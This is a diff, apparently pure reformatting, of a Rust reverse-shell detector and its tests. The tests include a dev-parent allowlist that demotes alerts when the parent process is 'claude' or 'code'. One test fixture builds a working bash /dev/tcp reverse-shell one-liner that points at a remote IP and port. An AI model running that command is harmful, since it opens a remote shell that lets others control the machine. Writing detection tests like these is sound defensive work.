@@ -623,9 +623,7 @@ impl ProcessModule {
         event
             .details
             .insert("severity_pre_demotion".into(), prior.to_string());
-        event
-            .details
-            .insert("response_hint".into(), "alert".into());
+        event.details.insert("response_hint".into(), "alert".into());
         debug!(
             parent_name = %parent_name,
             "Reverse-shell match demoted to medium/alert (dev parent allowlist)"
@@ -979,7 +977,11 @@ mod tests {
     fn test_devtcp_localhost_is_not_reverse_shell() {
         // Health-check patterns that should NOT be flagged.
         let localhost_cmds = [
-            join(&["/bin/sh -c bash -c 'echo > ", "/dev/tcp/", "localhost/6333'"]),
+            join(&[
+                "/bin/sh -c bash -c 'echo > ",
+                "/dev/tcp/",
+                "localhost/6333'",
+            ]),
             join(&["bash -c 'echo > ", "/dev/tcp/", "127.0.0.1/8080'"]),
             join(&["sh -c echo > ", "/dev/tcp/", "::1/443"]),
             join(&["bash -c 'echo > ", "/dev/tcp/", "0.0.0.0/5432'"]),
@@ -996,13 +998,7 @@ mod tests {
     #[test]
     fn test_devtcp_remote_is_reverse_shell() {
         // Actual remote reverse shell — assembled from fragments.
-        let cmd = join(&[
-            "bash ",
-            "-i ",
-            ">& ",
-            "/dev/tcp/",
-            "10.0.0.1/4444 0>&1",
-        ]);
+        let cmd = join(&["bash ", "-i ", ">& ", "/dev/tcp/", "10.0.0.1/4444 0>&1"]);
         assert!(
             match_reverse_shell(&cmd.to_lowercase()).is_some(),
             "Remote TCP-pseudo-device payload should match: {}",
@@ -1066,23 +1062,25 @@ mod tests {
         config.dev_parent_allowlist = vec!["claude".into(), "code".into()];
         let module = ProcessModule::new(config);
 
-        let event =
-            ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
-                .with_severity(ThreatSeverity::Critical)
-                .with_detail("parent_name", "claude");
-        let set: std::collections::HashSet<String> =
-            ["claude".to_string(), "code".to_string()].into_iter().collect();
+        let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+            .with_severity(ThreatSeverity::Critical)
+            .with_detail("parent_name", "claude");
+        let set: std::collections::HashSet<String> = ["claude".to_string(), "code".to_string()]
+            .into_iter()
+            .collect();
         let demoted = module.maybe_demote_for_dev_parent(event, &set);
         assert_eq!(demoted.severity, ThreatSeverity::Medium);
         assert_eq!(
-            demoted.details.get("degraded_by_dev_parent").map(String::as_str),
+            demoted
+                .details
+                .get("degraded_by_dev_parent")
+                .map(String::as_str),
             Some("true")
         );
 
-        let event2 =
-            ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
-                .with_severity(ThreatSeverity::Critical)
-                .with_detail("parent_name", "sshd");
+        let event2 = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+            .with_severity(ThreatSeverity::Critical)
+            .with_detail("parent_name", "sshd");
         let kept = module.maybe_demote_for_dev_parent(event2, &set);
         assert_eq!(kept.severity, ThreatSeverity::Critical);
         assert!(!kept.details.contains_key("degraded_by_dev_parent"));
@@ -1095,12 +1093,10 @@ mod tests {
         config.strict_under_dev_tools = true;
         let module = ProcessModule::new(config);
 
-        let event =
-            ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
-                .with_severity(ThreatSeverity::Critical)
-                .with_detail("parent_name", "claude");
-        let set: std::collections::HashSet<String> =
-            ["claude".to_string()].into_iter().collect();
+        let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+            .with_severity(ThreatSeverity::Critical)
+            .with_detail("parent_name", "claude");
+        let set: std::collections::HashSet<String> = ["claude".to_string()].into_iter().collect();
         let kept = module.maybe_demote_for_dev_parent(event, &set);
         assert_eq!(
             kept.severity,
